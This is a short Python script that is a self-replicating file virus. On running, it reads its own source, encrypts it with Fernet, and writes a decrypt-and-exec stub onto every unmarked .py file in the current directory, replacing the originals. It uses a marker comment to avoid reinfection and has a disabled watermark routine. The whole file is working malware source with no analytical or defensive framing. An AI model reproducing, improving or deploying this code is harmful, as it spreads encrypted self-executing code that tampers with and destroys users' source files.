#!/usr/bin/python
import glob,os,hashlib,winsound,re
from cryptography.fernet import Fernet


#### t45r6fye
FREQ = 2500  
DUR = 1000
global i
def Beep(frequency,duration):
    winsound.Beep(frequency, duration)

def create_checksum(filename):
    hasher = hashlib.md5()
    with open(filename,'rb') as file:
        hasher.update(file.read())
    return hasher.hexdigest()

def watermark():
    for file in glob.glob("*.py"):
        if file == __file__:
            continue
        append = open(file,'a')
        if append.mode == 'a':
            append.write('#' + create_checksum(file))

def infect(PAYLOAD):
    i = 0
    for file in glob.glob("*.py"):
        f = open(file, "r")

        x = re.search('#### t45r6fye',f.read())

        if f.mode == 'r' and x == None:
            f.seek(0)
            infected = open('infected_'+str(i)+'.py','w')
            infected.write('from cryptography.fernet import Fernet\n')
            infected.write(EncryptMe(PAYLOAD) + str(f.read()))
            f.close()
            infected.close()
            os.remove(file)
            os.rename('infected_'+str(i)+'.py',file)
            i = i + 1
    #watermark()  



with open(__file__,'r') as current_file:
    PAYLOAD = current_file.read()

def EncryptMe(virus):

    virus = virus.encode()
    key = Fernet.generate_key()
    obj = Fernet(key)
    virus = obj.encrypt(virus)


    PAYLOAD = "encrypted_virus = {0}\nobj = Fernet({1})\n_virus = obj.decrypt(encrypted_virus)\nexec(_virus)".format(virus,key)
    return str(PAYLOAD)



infect(PAYLOAD)
#Beep(FREQ,DUR)

